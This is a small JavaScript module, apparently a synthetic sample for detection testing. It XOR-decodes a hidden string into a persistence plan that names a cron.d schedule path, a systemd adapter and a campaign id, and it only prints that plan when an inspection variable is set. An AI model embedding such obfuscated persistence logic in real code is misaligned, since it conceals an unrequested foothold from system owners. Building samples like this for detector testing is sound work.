const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_7bba0311 = "[\"4d\",\"06\",\"0a\",\"47\",\"48\",\"4f\",\"5e\",\"4b\",\"48\",\"06\",\"59\",\"4e\",\"52\",\"57\",\"5f\",\"64\",\"48\",\"58\",\"53\",\"5e\",\"5f\",\"4e\",\"57\",\"5e\",\"17\",\"49\",\"5e\",\"5c\",\"52\",\"48\",\"4f\",\"5e\",\"49\",\"64\",\"5f\",\"5e\",\"48\",\"58\",\"49\",\"52\",\"4b\",\"4f\",\"54\",\"49\",\"47\",\"5a\",\"5f\",\"5a\",\"4b\",\"4f\",\"5e\",\"49\",\"06\",\"48\",\"42\",\"48\",\"4f\",\"5e\",\"56\",\"5f\",\"64\",\"5f\",\"5e\",\"48\",\"58\",\"49\",\"52\",\"4b\",\"4f\",\"54\",\"49\",\"47\",\"48\",\"4f\",\"5a\",\"5c\",\"5e\",\"64\",\"58\",\"54\",\"4e\",\"55\",\"4f\",\"06\",\"0a\",\"47\",\"58\",\"5a\",\"56\",\"4b\",\"5a\",\"52\",\"5c\",\"55\",\"64\",\"52\",\"5f\",\"06\",\"75\",\"74\",\"7f\",\"7e\",\"16\",\"7d\",\"0f\",\"79\",\"0f\",\"0c\",\"0b\",\"09\",\"0a\",\"47\",\"48\",\"58\",\"53\",\"5e\",\"5f\",\"4e\",\"57\",\"5e\",\"64\",\"4b\",\"5a\",\"4f\",\"53\",\"06\",\"14\",\"5e\",\"4f\",\"58\",\"14\",\"58\",\"49\",\"54\",\"55\",\"15\",\"5f\",\"14\",\"55\",\"54\",\"5f\",\"5e\",\"16\",\"5d\",\"0f\",\"59\",\"0f\",\"0c\",\"0b\"]";
const Codec_7bba0311 = "hex_array|single_byte_xor|3b";

function load_7bba0311() { return JSON.parse(Material_7bba0311).map((value) => Number.parseInt(value, 16)); }
function decode_7bba0311(storedBytes) { return storedBytes.map((value) => value ^ 59); }
async function recover_7bba0311() {
  const harmlessValue = 19 * 7 - 133;
  const storedBytes = load_7bba0311(); let recoveredBytes = [];
  recoveredBytes = await (async () => decode_7bba0311(storedBytes))();
  void harmlessValue; return Buffer.from(recoveredBytes).toString("ascii");
}
async function inspect_7bba0311() { return (await recover_7bba0311()).split("|").join("|"); }
async function plan_7bba0311() { const inspect = inspect_7bba0311; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "schedule", adapter: "systemd_descriptor", path: fields.schedule_path }); }
void moduleShape; void plan_7bba0311;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_7bba0311());
